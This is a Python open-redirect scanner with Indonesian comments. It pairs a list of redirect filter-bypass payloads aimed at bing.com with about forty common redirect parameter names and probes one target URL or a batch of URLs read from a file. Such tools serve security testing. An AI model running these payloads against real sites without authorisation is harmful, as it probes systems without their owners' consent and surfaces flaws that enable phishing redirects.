import requests
import urllib.parse

# ASCII BANNER
print(r"""
 ______   .______    _______ .__   __. .______       _______  _______   __  .______       _______   ______ .___________.
/  __  \  |   _  \  |   ____||  \ |  | |   _  \     |   ____||       \ |  | |   _  \     |   ____| /      ||           |
|  |  |  | |  |_)  | |  |__   |   \|  | |  |_)  |    |  |__   |  .--.  ||  | |  |_)  |    |  |__   |  ,----'`---|  |----`
|  |  |  | |   ___/  |   __|  |  . `  | |      /     |   __|  |  |  |  ||  | |      /     |   __|  |  |         |  |     
|  `--'  | |  |      |  |____ |  |\   | |  |\  \----.|  |____ |  '--'  ||  | |  |\  \----.|  |____ |  `----.    |  |     
\______/  | _|      |_______||__| \__| | _| `._____||_______||_______/ |__| | _| `._____||_______| \______|    |__|     
                                                                                                                      
""")

# Payload bypass Open Redirect
bypass_payloads = [
    "https://bing.com",
    "//bing.com",
    "/\\bing.com",
    "https:/bing.com",
    "https://bing%E3%80%82com",
    "https://bing.com/%2e%2e",
    "https://bing.com/%2f%2e%2e",
    "https://bing.com/%2f..",
    "https://bing.com%2e%2e",
    "https://bing.com%2f%2e%2e",
    "%09/https://bing.com",
    "%5c/https://bing.com",
    "%2F/bing.com",
    "%0Dbing.com"
]

# Parameter redirect yang umum digunakan
redirect_params = [
    "url", "redirect", "next", "target", "link", "rurl", "dest", "destination",
    "image_url", "go", "success", "logout", "login", "clickurl", "forward_url",
    "jump_url", "originUrl", "page", "action_url", "src", "linkAddress",
    "location", "request", "backurl", "ReturnUrl", "redirect_uri", "redirectto",
    "return", "callback_url", "path", "referrer", "recipient", "u", "hostname",
    "returnTo", "return_path", "image", "requestTokenAndRedirect", "retURL",
    "next_url"
]

# Fungsi untuk validasi URL
def is_valid_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        return all([parsed.scheme in ("http", "https"), parsed.netloc])
    except:
        return False

# Fungsi untuk menguji Open Redirect
def test_open_redirect(base_url):
    if not is_valid_url(base_url):
        print(f"[⚠️] URL tidak valid: {base_url}")
        return

    vulnerable = False

    for param in redirect_params:
        for payload in bypass_payloads:
            encoded_payload = urllib.parse.quote(payload, safe='')  # Encode payload
            test_url = f"{base_url}?{param}={encoded_payload}"
            
            try:
                response = requests.get(test_url, allow_redirects=False)
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get("Location", "")
                    parsed_location = urllib.parse.urlparse(location)

                    # Cek apakah redirect benar-benar ke bing.com
                    if parsed_location.netloc.lower() == "bing.com" or parsed_location.netloc.lower().endswith(".bing.com"):
                        print(f"[✅] {test_url} -> {location} [Status: {response.status_code}]")
                        vulnerable = True
                        return  # Stop di URL pertama yang rentan
            except requests.RequestException as e:
                print(f"[⚠️] Gagal mengakses: {test_url} ({e})")

    if not vulnerable:
        print(f"[❌] Tidak ditemukan Open Redirect pada: {base_url}")

# Fungsi untuk membaca banyak URL dari file .txt
def test_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
            for url in urls:
                test_open_redirect(url)
    except FileNotFoundError:
        print("[⚠️] File tidak ditemukan!")

# Menu utama
def main():
    print("🔍 Open Redirect Scanner 🔍")
    print("[1] Uji satu URL")
    print("[2] Uji banyak URL dari file .txt")
    
    choice = input("Pilih mode (1/2): ")
    
    if choice == "1":
        url = input("Masukkan URL target: ")
        test_open_redirect(url)
    elif choice == "2":
        file_path = input("Masukkan path file .txt: ")
        test_from_file(file_path)
    else:
        print("Pilihan tidak valid!")

if __name__ == "__main__":
    main()